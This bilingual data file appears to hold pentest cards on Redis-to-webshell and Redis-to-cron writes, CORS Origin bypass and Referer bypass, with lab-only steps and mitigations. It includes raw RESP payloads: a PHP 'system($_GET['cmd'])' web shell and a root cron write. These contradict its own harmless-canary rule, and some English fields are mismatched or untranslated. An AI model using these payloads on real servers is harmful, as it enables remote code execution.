name.zh: Redis 持久化配置写入 WebShell
name.en: Redis Persistence Configuration to Web Shell

description.zh: 验证暴露且高权限的 Redis 是否能通过持久化目录与文件名配置，把受控值写入 Web 可执行目录；命令操作归工具，利用条件保留为 RCE Payload。
description.en: Tests whether an exposed privileged Redis instance can use persistence directory and filename settings to write controlled data into a web-executable path; mechanics belong in tools while the exploit condition remains an RCE payload.

prerequisites.zh: 把 Redis CONFIG/SAVE 工具操作与 Web 可执行文件条件分开审批，只使用隔离 Redis、临时 Web 根和无外网解释器。
prerequisites.en: Approve Redis CONFIG and SAVE mechanics separately from web-executable-file conditions, using only isolated Redis, a temporary web root, and an interpreter without network access.

prerequisites.zh: 确认 Redis 服务账户对临时目录的写权限、RDB 文件格式及 Web 映射，并以固定无输入 canary 替代命令执行。
prerequisites.en: Confirm Redis service-account write access, RDB file format, and web mapping for the temporary directory, replacing command execution with a fixed input-free canary.

title.zh: RESP WebShell 值写入

description.zh: 使用一条长度一致的 RESP SET 消息保存隔离测试用 PHP 内容；目录、文件名和持久化操作在 Redis 工具卡中单独说明。
description.en: Store isolated PHP test content with one length-correct RESP SET message; directory, filename, and persistence operations remain in the Redis tool card.

analysis.zh: 拆分后的阳性证据要求工具侧审计显示 CONFIG 与 SAVE 确实写入临时路径，同时 Web 侧只执行固定 canary 并可由文件、进程和请求日志关联。Redis 中存在 PHP 字符串、SAVE 成功、文件不可解析、静态下载、HTTP 500 或模型声称生成 shell 都不能证明 WebShell/RCE。
analysis.en: Positive evidence after splitting requires tool-side auditing to show CONFIG and SAVE writing the temporary path, while the web side executes only a fixed canary correlated through file, process, and request logs. A PHP string in Redis, successful SAVE, an unparsable file, static download, HTTP 500, or a model claiming a shell was generated does not prove a webshell or RCE.

opsecTips.zh: 无输入 canary 首次从临时 Web 路径执行后停止，禁止使用语料中的 eval/system/shell_exec 入口或传递命令参数。
opsecTips.en: Stop after the input-free canary executes once from the temporary web path; do not use the corpus's eval, system, or shell_exec entry points or pass command arguments.

opsecTips.zh: 恢复 Redis dir/dbfilename，删除测试键、RDB 与临时 Web 根，重启隔离解释器并撤销 Redis 服务账户写权限。
opsecTips.en: Restore Redis dir and dbfilename, delete test keys, RDB files, and the temporary web root, restart the isolated interpreter, and revoke Redis service-account write access.

title.zh: 确认 Redis 与 Web 根目录边界
title.en: Confirm the Redis and web-root boundary

description.zh: 在隔离副本确认 Redis 身份、CONFIG 权限、RDB 持久化方式和 Web 根目录解析条件。
description.en: Confirm Redis identity, CONFIG privileges, RDB persistence behavior, and web-root parsing conditions in an isolated copy.

title.zh: 写入单一测试值

description.zh: 发送长度一致的 RESP SET 消息，只保存可识别测试内容并记录 Redis 日志与键值。
description.en: Send the length-correct RESP SET message, store only recognizable test content, and record Redis logs and the resulting key.

attackChain.payload:
*3
$3
SET
$8
webshell
$30
<?php system($_GET['cmd']); ?>

title.zh: 验证文件与解释器条件

description.zh: 仅在测试目录验证持久化文件是否进入 PHP 解释路径，并排除静态下载、旧文件或缓存响应。
description.en: Validate only in a test directory whether the persisted file reaches PHP interpretation, excluding static download, stale files, and cached responses.

title.zh: 恢复配置并删除测试数据
title.en: Restore configuration and remove test data

description.zh: 恢复 Redis 持久化配置、删除测试键和文件，并复测 CONFIG 权限与网络访问控制。
description.en: Restore Redis persistence configuration, delete the test key and file, and retest CONFIG privileges and network controls.

overview.zh: 该链路要求 Redis 连接具备 CONFIG 与持久化权限、进程对目标目录可写、Web 服务器会解释生成文件，三项缺一都不能形成 WebShell 执行
overview.en: This chain requires Redis CONFIG and persistence privileges, filesystem write access to the target directory, and a web server that interprets the generated file; without all three, no webshell execution exists

vulnerability.zh: 风险来自未授权或过度授权的 Redis 与危险文件系统边界组合，原始 RESP 数据只是传输形式；把写入成功等同于代码执行会夸大结论
vulnerability.en: The risk is the combination of unauthorized or overprivileged Redis access and a dangerous filesystem boundary; RESP data is only the transport, and a successful write alone must not be equated with code execution

exploitation.zh: 1. 在隔离容器中确认 Redis ACL、CONFIG 权限、持久化模式和目标目录写权限；2. 使用原始 RESP 载荷写入无害固定标记，禁止使用真实后门内容，并记录 SAVE/BGSAVE 与文件哈希；3. 通过测试 Web 路由判断文件是下载、文本显示还是被解释。只有固定标记进入解释路径才证明 RCE 条件；写入非 Web 目录或静态下载属于假阳性。
exploitation.en: 1. In an isolated container, verify Redis ACLs, CONFIG permission, persistence mode, and target-directory write access. 2. Use the original RESP payload with a harmless fixed marker instead of a real backdoor and record SAVE or BGSAVE plus the file hash. 3. Check through a test web route whether the file is downloaded, displayed, or interpreted. RCE conditions are proven only when the marker reaches an interpreter; writing outside the web root or static download is a false positive.

mitigation.zh: 1. Redis 仅监听受信网络并使用 ACL 禁止不需要的 CONFIG、SAVE 与模块命令；2. 以专用低权限账户运行 Redis，文件系统隔离且不可写 Web 根目录；3. 对 CONFIG SET、持久化路径变化和 Web 目录新增脚本文件告警。
mitigation.en: 1. Expose Redis only to trusted networks and use ACLs to deny unnecessary CONFIG, SAVE, and module commands. 2. Run Redis as a dedicated low-privilege account with filesystem isolation and no write access to web roots. 3. Alert on CONFIG SET, persistence-path changes, and new script files in web directories.

name.zh: Redis 持久化配置写入 Cron

description.zh: 验证高权限 Redis 是否能把持久化文件写入 Cron 读取位置并形成计划任务执行；Redis 命令归工具，执行条件链归 RCE/持久化 Payload。
description.en: Tests whether privileged Redis persistence can write into a cron-consumed location and create scheduled execution; Redis mechanics belong in tools while the execution chain remains an RCE or persistence payload.

prerequisites.zh: 在一次性主机或容器中分离 Redis 管理命令与 cron 消费链，记录 CONFIG 权限、服务 UID、目录和 cron 实现。
prerequisites.en: Separate Redis administration from the cron-consumption chain on a disposable host or container, recording CONFIG privileges, service UID, paths, and cron implementation.

prerequisites.zh: 使用只创建临时 canary 文件且运行一次的计划任务，预先验证 RDB 前后缀不会让 cron 解析真实命令。
prerequisites.en: Use a one-shot scheduled task that creates only a temporary canary file, first verifying how RDB prefixes and suffixes affect cron parsing.

title.zh: RESP Cron 持久化序列

description.zh: 在可回滚实验副本中展示完整 RESP 配置、测试 Cron 内容和 SAVE 序列；执行后必须恢复配置并清理。
description.en: Show the complete RESP configuration, proof-only cron content, and SAVE sequence in a rollback-capable lab copy; restore configuration and clean up afterward.

analysis.zh: 拆分链阳性要求 Redis 审计确认测试文件落入专用 cron 目录，且调度器日志显示固定任务以预期低权限 UID 执行并生成 canary。CONFIG 返回 OK、SAVE 产生文件、cron 文件语法无效、任务未触发、网络连接来自其他进程或只有 Redis 键值都不是计划执行证据。
analysis.en: Positive evidence for the split chain requires Redis auditing to confirm a test file in the dedicated cron directory and scheduler logs to show the fixed task running once under the expected low-privilege UID and creating the canary. CONFIG returning OK, SAVE creating a file, invalid cron syntax, a task that never runs, a network connection from another process, or only a Redis value is not scheduled-execution evidence.

opsecTips.zh: 单次 canary 任务被调度后立即停止，不加入反向连接、持久循环或系统命令。
opsecTips.en: Stop immediately after the one-shot canary task is scheduled; do not add reverse connections, persistent loops, or system commands.

opsecTips.zh: 删除 cron 测试文件与 canary，恢复 Redis 持久化目录和文件名，清除测试键并重建一次性主机。
opsecTips.en: Delete the cron test file and canary, restore Redis persistence directory and filename, clear test keys, and rebuild the disposable host.

title.zh: 确认版本、权限与 Cron 路径
title.en: Confirm version, privileges, and cron path

description.zh: 在隔离副本确认 Redis CONFIG/SAVE 权限、运行账户写权限和目标发行版 Cron 文件规则。
description.en: In an isolated copy, confirm Redis CONFIG and SAVE privileges, service-account write access, and the distribution's cron file rules.

title.zh: 发送证明型 RESP 序列

description.zh: 发送只写入 id 证明文件的完整序列，关联 Redis 命令日志、RDB 文件和 Cron 加载事件。
description.en: Send the complete sequence that writes only an id proof file and correlate Redis command logs, the RDB file, and cron loading events.

attackChain.payload:
*4
$6
CONFIG
$3
SET
$3
dir
$15
/var/spool/cron
*4
$6
CONFIG
$3
SET
$10
dbfilename
$4
root
*3
$3
SET
$4
cron
$52

*/1 * * * * bash -c 'id > /tmp/redis-cron-proof'

*1
$4
SAVE

title.zh: 区分写文件与 Cron 执行
title.en: Distinguish file write from cron execution

description.zh: 只有 Cron 守护进程加载文件并生成证明文件才确认执行；单独出现 RDB 文件不算成功。
description.en: Execution is confirmed only when the cron daemon loads the file and creates the proof file; an RDB file alone is insufficient.

title.zh: 恢复并验证控制措施

description.zh: 删除测试 Cron/RDB/证明文件，恢复 dir 与 dbfilename，并验证 ACL、protected-mode 和文件权限。
description.en: Remove test cron, RDB, and proof files, restore dir and dbfilename, and validate ACLs, protected mode, and filesystem permissions.

overview.zh: Redis 写 Cron 依赖 CONFIG 权限、操作系统目录与格式、Redis 进程写权限、cron 服务读取规则和任务内容五个条件，不能仅凭 SAVE 成功判定命令执行
overview.en: Redis-to-cron execution depends on CONFIG permission, operating-system paths and formats, Redis process write access, cron parsing rules, and task content; a successful SAVE alone does not prove command execution

vulnerability.zh: 当 Redis 暴露且以过高系统权限运行，攻击者可能修改持久化目录和文件名，把数据库快照写入计划任务位置；不同发行版的 cron 格式会显著影响可利用性
vulnerability.en: When Redis is exposed and runs with excessive OS privileges, an attacker may change persistence paths and filenames to place a database snapshot in a scheduled-task location; cron formats vary significantly across distributions

exploitation.zh: 1. 在一次性 Linux 容器核对 Redis ACL、运行用户、cron 目录和实际解析格式；2. 用原始 RESP 载荷验证路径控制，但任务内容替换为写入临时日志的无害标记；3. 观察生成文件、cron 解析日志和标记时间线，并恢复配置。文件存在但 cron 拒绝格式、权限不足或服务未运行均为假阳性。
exploitation.en: 1. In a disposable Linux container, inspect Redis ACLs, runtime user, cron directories, and the actual parser format. 2. Use the original RESP payload to validate path control but replace task content with a harmless marker written to a temporary log. 3. Observe the generated file, cron parser logs, and marker timeline, then restore configuration. A file that cron rejects, insufficient permissions, or a stopped cron service are false positives.

mitigation.zh: 1. 使用 Redis ACL 禁止非管理主体调用 CONFIG 与持久化命令；2. 以不可写系统计划任务目录的专用账户运行 Redis，并启用 MAC/容器隔离；3. 监控 Redis dir/dbfilename 变化、cron 目录写入和异常计划任务。
mitigation.en: 1. Deny CONFIG and persistence commands to non-administrative Redis principals. 2. Run Redis as a dedicated account that cannot write system scheduling directories and apply MAC or container isolation. 3. Monitor Redis dir and dbfilename changes, cron-directory writes, and anomalous scheduled tasks.

name.zh: Origin 校验绕过变体

description.zh: 验证 API 或认证端点是否错误信任任意、后缀混淆或特殊 Origin，从而允许跨源读取带凭证响应。
description.en: Tests whether an API or authentication endpoint trusts arbitrary, suffix-confused, or special Origin values and permits credentialed cross-origin reads.

prerequisites.zh: 使用独立攻击源和合成登录账户，在真实浏览器中确认目标响应包含无敏感 canary，并记录凭证模式和 SameSite 行为。
prerequisites.en: Use a separate attacker origin and synthetic logged-in account in a real browser, ensuring the target response contains a nonsensitive canary and recording credential mode and SameSite behavior.

prerequisites.zh: 为精确允许源、外部主机、后缀混淆、端口和特殊 Origin 建立配对，捕获请求 Origin 及全部 CORS 响应头。
prerequisites.en: Pair the exact allowed origin with external hosts, suffix confusion, ports, and special Origin values, capturing request Origin and all CORS response headers.

title.zh: Origin注入

description.zh: Origin注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Origin Validation Bypass Variants validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求不受信任 Origin 的浏览器脚本在携带合成凭证时实际读取 canary 响应，且响应头组合满足浏览器 CORS 规则。服务器返回 200、仅反射 Origin、预检通过但实际请求失败、凭证未发送、响应为公开内容或 curl 能读取都不是凭证化跨源泄露。
analysis.en: Positive evidence requires browser script from an untrusted Origin to actually read the canary response while synthetic credentials are sent, with response headers satisfying browser CORS rules. HTTP 200, Origin reflection alone, successful preflight followed by failed actual request, absent credentials, public content, or curl being able to read the response is not credentialed cross-origin exposure.

opsecTips.zh: 攻击源首次读取一个无敏感 canary 后停止，不请求账户资料、token 或写接口。
opsecTips.en: Stop after the attacker origin reads one nonsensitive canary; do not request account data, tokens, or write endpoints.

opsecTips.zh: 注销测试会话，删除攻击源页面和浏览器配置文件，清除预检缓存，并恢复精确 Origin 白名单与 Vary: Origin。
opsecTips.en: Revoke the test session, delete the attacker-origin page and browser profile, clear preflight caches, and restore an exact Origin allowlist and Vary: Origin.

title.zh: 记录可信源基线

description.zh: 捕获可信源请求的 ACAO、ACAC、Vary 与预检结果。
description.en: Capture ACAO, ACAC, Vary, and preflight behavior for a trusted origin.

title.zh: 提交 Origin 候选

description.zh: 逐项使用原始域名变体，保持方法、Cookie 和请求体不变。
description.en: Use the original origin variants one at a time while preserving method, cookies, and body.

title.zh: 在浏览器验证读取

description.zh: 从攻击者源脚本读取无害受保护字段，区分服务端响应和浏览器可读性。
description.en: Read a harmless protected field from attacker-origin script and distinguish server response from browser readability.

overview.zh: Origin 头描述发起请求的源，浏览器是否允许脚本读取响应由 CORS 响应头决定；把任意域名列表称为认证注入会遗漏真正的跨源读取条件
overview.en: Origin 头描述发起请求的源，浏览器是否允许脚本读取响应由 CORS 响应头决定；把任意域名列表称为认证注入会遗漏真正的跨源读取条件

vulnerability.zh: 危险实现会反射 Origin、使用不带边界的后缀正则，或在 Access-Control-Allow-Credentials 为 true 时接受攻击者源，使浏览器暴露已认证响应
vulnerability.en: A dangerous implementation reflects Origin, uses a suffix regex without label boundaries, or accepts an attacker origin while Access-Control-Allow-Credentials is true, exposing authenticated responses to browser script

exploitation.zh: 1. 从受信源和无 Origin 请求建立 CORS 基线；2. 逐个提交原始 Origin 变体并记录 ACAO、ACAC、Vary 与预检结果；3. 在不同源浏览器页面使用测试账号读取无害受保护字段。只有浏览器允许攻击者源脚本读取带凭证响应才成立；服务器返回数据但浏览器因 CORS 阻止读取是假阳性。
exploitation.en: 1. Establish CORS baselines from a trusted origin and without Origin. 2. Submit each original Origin variant and record ACAO, ACAC, Vary, and preflight behavior. 3. From another origin in a browser, use a test account to read a harmless protected field. The flaw exists only when attacker-origin script can read a credentialed response; a server response blocked by the browser is a false positive.

mitigation.zh: 1. 解析 Origin 并与完整 scheme/host/port 白名单精确匹配；2. 仅在必要端点启用凭证 CORS，动态响应时添加 Vary: Origin；3. 对 null、子域后缀、端口和 Unicode 域名建立浏览器回归测试。
mitigation.en: 1. Parse Origin and compare the complete scheme, host, and port against an exact allowlist. 2. Enable credentialed CORS only where necessary and send Vary: Origin for dynamic responses. 3. Add browser tests for null, suffix-confused subdomains, ports, and Unicode domains.

name.zh: Referer 访问控制绕过变体

description.zh: 验证应用是否把可缺失、可裁剪且受策略影响的 Referer 当作主要认证或授权依据。
description.en: Tests whether an application treats the optional, policy-dependent, and privacy-trimmed Referer header as a primary authentication or authorization signal.

prerequisites.zh: 建立无权限与有权限合成主体，对同一只读 canary 资源记录有 Referer、缺失 Referer 和伪造 Referer 的授权基线。
prerequisites.en: Create unauthorized and authorized synthetic principals and record authorization baselines for the same read-only canary resource with present, absent, and forged Referer.

prerequisites.zh: 记录浏览器 Referrer-Policy、代理裁剪结果和服务端最终主体，确保测试只改变 Referer 而不改变 Cookie 或 Authorization。
prerequisites.en: Record browser Referrer-Policy, proxy trimming, and the server's final principal, ensuring only Referer changes while Cookie and Authorization remain fixed.

description.en: Run this Referer-Based Access-Control Bypass Variants validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性是同一无权限主体仅因 Referer 伪装成可信页面而被服务器授予 canary 访问，授权日志显示 Referer 是决定性条件。Referer 被接收或记录、风险评分变化、重定向到登录页、缓存响应、原主体本已有权限或 CSRF token 同时有效都不是基于 Referer 的授权绕过。
analysis.en: 阳性是同一无权限主体仅因 Referer 伪装成可信页面而被服务器授予 canary 访问，授权日志显示 Referer 是决定性条件。Referer 被接收或记录、风险评分变化、重定向到登录页、缓存响应、原主体本已有权限或 CSRF token 同时有效都不是基于 Referer 的授权绕过。

opsecTips.zh: 一个只读 canary 因 Referer 单独被放行后停止，不转向对象写入或其他用户资源。
opsecTips.en: Stop after one read-only canary is allowed solely because of Referer; do not move to object writes or other users' resources.

opsecTips.zh: 删除合成主体和 canary，清除代理与授权调试日志，并恢复基于会话/对象的服务端授权及 Referrer-Policy。
opsecTips.en: Delete synthetic principals and the canary, clear proxy and authorization debug logs, and restore session- and object-based server authorization and Referrer-Policy.

description.zh: 提交原始 Referer 变体及空头对照，每次只改变来源。
